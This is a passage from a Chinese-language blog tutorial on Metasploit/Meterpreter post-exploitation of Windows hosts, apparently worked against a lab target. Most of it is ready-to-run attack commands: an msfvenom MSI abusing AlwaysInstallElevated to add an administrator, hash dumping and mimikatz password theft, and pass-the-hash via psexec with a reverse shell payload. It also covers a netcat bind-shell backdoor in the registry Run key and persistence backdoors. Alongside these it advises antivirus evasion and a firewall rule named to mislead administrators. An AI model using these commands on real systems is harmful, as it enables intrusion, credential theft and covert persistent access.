&lt;h3 id=&#34;利用-alwaysinstallelevated-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用-alwaysinstallelevated-提权&#34;&gt;#&lt;/a&gt; 利用 AlwaysInstallElevated 提权&lt;/h3&gt;
&lt;p&gt;AlwaysInstallElevated 是一个策略设置。微软允许非授权用户以 SYSTEM 权限运行安装文件 (MSI)，如果用户启用此策略设置，那么黑客利用恶意的 MSI 文件就可以进行管理员权限的提升。&lt;/p&gt;
&lt;p&gt;查看 AlwaysInstallElevated 是否被定义&lt;/p&gt;
&lt;p&gt;不过利用此方法有个前提条件，需要有两个注册表的键值为 1，我们可以在 cmdshell 下查看 AlwaysInstallElevated 是否被定义&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306173505093.png&#34; alt=&#34;image-20210306173505093&#34;&gt;&lt;/p&gt;
&lt;p&gt;如上图所示已经开启 AlwaysInstallElevated，如果在组策略里未定义 AlwaysInstallElevated，则会出现 “错误：系统找不到指定的注册表项或值” 的提示，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306173520115.png&#34; alt=&#34;image-20210306173520115&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果需要开启可以选择以下方法：&lt;br&gt;
1. 打开组策略编辑器（运行框输入 gpedit.msc）&lt;br&gt;
2. 组策略 -&amp;gt; 计算机配置 -&amp;gt; 管理模版 -&amp;gt;Windows 组件 -&amp;gt;Windows Installer-&amp;gt; 永远以高特权进行安装：选择启用&lt;br&gt;
 3. 组策略 -&amp;gt; 用户配置 -&amp;gt; 管理模版 -&amp;gt;Windows 组件 -&amp;gt;Windows Installer-&amp;gt; 永远以高特权进行安装：选择启用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306173539689.png&#34; alt=&#34;image-20210306173539689&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置完成后对应注册表的位置值会设为 1，开启 AlwaysInstallElevated。&lt;/p&gt;
&lt;p&gt;生成 MSI 安装文件&lt;/p&gt;
&lt;p&gt;利用 msfvenom 命令生成一个在目标机上增加管理员用户的 MSI 安装文件，这里密码要设置为强密码，否则会报错。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/adduser USER=msi PASS=Abc123@@ -f msi -o msi.msi&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传并执行 MSI 文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;upload msi.msi c:\\Users\\test # 部分目录由于权限原因可能上传失败&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msiexec /quiet /qn /i msi.msi # /quiet=安装过程中禁止向用户发送消息 /qn=不使用图形界面 /i=安装程序&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net localgroup administrators&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行成功后查看管理员组发现用户已经添加成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306173648978.png&#34; alt=&#34;image-20210306173648978&#34;&gt;&lt;/p&gt;
&lt;p&gt;注意：&lt;br&gt;
由于是 msf 生成的 msi 文件，所以默认会被杀毒软件拦截，需要做好免杀。&lt;/p&gt;
&lt;h2 id=&#34;窃取-hash-及密码哈希传递&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#窃取-hash-及密码哈希传递&#34;&gt;#&lt;/a&gt; 窃取 hash 及密码 &amp;amp; 哈希传递&lt;/h2&gt;
&lt;p&gt;窃取 hash 及密码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hashdump&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/smart_hashdump&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;得到的 hash 可以拿去 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbWQ1LmNvbS8=&#34;&gt;https://cmd5.com/&lt;/span&gt; 解密一下即是用户密码&lt;/p&gt;
&lt;p&gt;或者 ophrack 进行解密&lt;/p&gt;
&lt;h3 id=&#34;mimikatz&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mimikatz&#34;&gt;#&lt;/a&gt; mimikatz&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msf5:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;load mimikatz # 加载 mimikatz 模块&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msv # 获取用户和 hash 值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kerberos # 获取内存中的明文密码信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wdigest # 获取内存中的明文密码信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz_command -f a:: # 需要以错误的模块来让正确的模块显示&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz_command -f sekurlsa::searchPasswords # 获取用户密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz_command -f samdump::hashes # 执行用户 hash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msf6：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;load kiwi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;creds_all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kiwi_cmd sekurlsa::logonpasswords&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306174435101.png&#34; alt=&#34;image-20210306174435101&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;哈希传递&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#哈希传递&#34;&gt;#&lt;/a&gt; 哈希传递&lt;/h3&gt;
&lt;p&gt;利用 hashdump 得到用户的 hash 后可利用 psexec 模块进行哈希传递攻击。&lt;br&gt;
使用 psexec 的前提：SMB 服务必须开启，也就是开启 445 端口；Admin$ 可以访问&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/smb/psexec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set LHOST 192.168.183.147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set LPORT 443&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set RHOST 192.168.183.154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set SMBUSER Administrator&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set SMBPASS ccf**4ee:3db**678&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set SMBDOMAIN WORKGROUP # 域用户需要设置 SMBDOMAIN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;rdp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rdp&#34;&gt;#&lt;/a&gt; RDP&lt;/h2&gt;
&lt;h3 id=&#34;getgui-命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#getgui-命令&#34;&gt;#&lt;/a&gt; getgui 命令&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run getgui –h # 查看帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run getgui -e # 开启远程桌面&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run getgui -u admin -p admin # 添加用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run getgui -f 6666 -e # 3389 端口转发到 6666&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdesktop 127.0.0.1:6666&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;enable_rdp-脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#enable_rdp-脚本&#34;&gt;#&lt;/a&gt; enable_rdp 脚本&lt;/h3&gt;
&lt;p&gt;通过 enable_rdp 脚本将用户添加到远程桌面用户组和管理员用户组&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/manage/enable_rdp #开启远程桌面&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=admin # 添加用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/manage/enable_rdp FORWARD=true LPORT=6667 # 将 3389 端口转发到 666&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;远程桌面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#远程桌面&#34;&gt;#&lt;/a&gt; 远程桌面&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;enumdesktops # 查看可用的桌面&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getdesktop # 获取当前 meterpreter 关联的桌面&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setdesktop # 设置 meterpreter 关联的桌面 -h 查看帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run vnc # 使用 vnc 远程桌面连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdesktop 127.0.0.1:1111 # 需要输入用户名密码连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdesktop -u Administrator -p 123 127.0.0.1:1111 # -u 用户名 -p 密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;注册表操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注册表操作&#34;&gt;#&lt;/a&gt; 注册表操作&lt;/h2&gt;
&lt;p&gt;注册表基本命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;reg –h # 查看帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-k 注册表的路径 -v 键的名称 -d 键值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg enumkey [-k &amp;lt;key&amp;gt;] # 枚举注册表的内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg createkey [-k &amp;lt;key&amp;gt;] # 创建注册表项&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg deletekey [-k &amp;lt;key&amp;gt;] # 删除注册表项&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg setval [-k &amp;lt;key&amp;gt; -v &amp;lt;val&amp;gt; -d &amp;lt;data&amp;gt;] # 在注册表里添加内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg deleteval [-k &amp;lt;key&amp;gt; -v &amp;lt;val&amp;gt;] # 删除注册表的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg queryval [-k &amp;lt;key&amp;gt; -v &amp;lt;val&amp;gt;] # 查询注册表的值&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;利用注册表添加-nc-后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用注册表添加-nc-后门&#34;&gt;#&lt;/a&gt; 利用注册表添加 nc 后门&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 # 上传 nc 到目标主机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run # 枚举注册表 run 下的键值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v test_nc -d &amp;#x27;C:\windows\system32\nc.exe -Ldp 443&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-e cmd.exe&amp;#x27; # 设置键值 -v 键的名称 -d 键值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v test_nc # 查看 test_nc 的键值&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306175106706.png&#34; alt=&#34;image-20210306175106706&#34;&gt;&lt;/p&gt;
&lt;p&gt;2. 设置防火墙允许通过 443 端口（如果目标主机开启防火墙，没有设置相应的规则可能会导致连接失败。）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netsh firewall show opmode # 查看防火墙状态&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netsh firewall add portopening TCP 443 &amp;quot;网络发现(Pub PSD-Out)&amp;quot; ENABLE ALL # 添加防火墙的规则允许 443 端口通过(这里“网络发现&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(Pub PSD-Out)”是规则名称，目的是为了迷惑管理员。)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3. 待目标主机重启后，自启 nc 程序，然后我们利用 nc 连接即&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306175148419.png&#34; alt=&#34;image-20210306175148419&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;后门植入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#后门植入&#34;&gt;#&lt;/a&gt; 后门植入&lt;/h2&gt;
&lt;p&gt;在我们通过漏洞获取到目标主机权限之后，如果目标主机主机重启亦或是管理员发现并修补了漏洞，那么我们就会失去对服务器的控制权，所以我们需要通过植入后门来维持权限，前面说的 nc 后门就是其中一种，另外一般还有 Persistence 和 Metsvc&lt;/p&gt;
&lt;h3 id=&#34;persistence通过启动项安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#persistence通过启动项安装&#34;&gt;#&lt;/a&gt; Persistence (通过启动项安装)&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run persistence –h # 查看帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run persistence -X -i 5 -p 3333 -r 本地IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run persistence -U -i 5 -p 3333 -r 本地IP -L c:\\Windows\\System32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-X：设置后门在系统启动后自启动。该方式会在 HKLM\Software\Microsoft\Windows\CurrentVersion\Run 下添加注册表信息。由于权限原因会导&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;致添加失败，后门无法启动。因此在非管理员权限下，不推荐使用该参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-U：设置后门在用户登录后自启动。该方式会在 HKCU\Software\Microsoft\Windows\CurrentVersion\Run 下添加注册表信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-L：后门传到远程主机的位置默认为%TEMP%&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-i：设置反向连接间隔时间为 5 秒&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-p：设置反向连接的端口号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-r：设置反向连接的 ip 地址&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306180420630.png&#34; alt=&#34;image-20210306180420630&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306180507815.png&#34; alt=&#34;image-20210306180507815&#34;&gt;&lt;/p&gt;
&lt;p&gt;靶机被成功植入后门&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306181305480.png&#34; alt=&#34;image-20210306181305480&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight cmd&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;backgroup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; lhost &lt;span class=&#34;number&#34;&gt;172&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;197&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;number&#34;&gt;4444&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; paylod windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit 成功获得shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306180717910.png&#34; alt=&#34;image-20210306180717910&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;metsvc通过服务安装一句话需要权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#metsvc通过服务安装一句话需要权限&#34;&gt;#&lt;/a&gt; Metsvc (通过服务安装) 一句话需要权限&lt;/h3&gt;
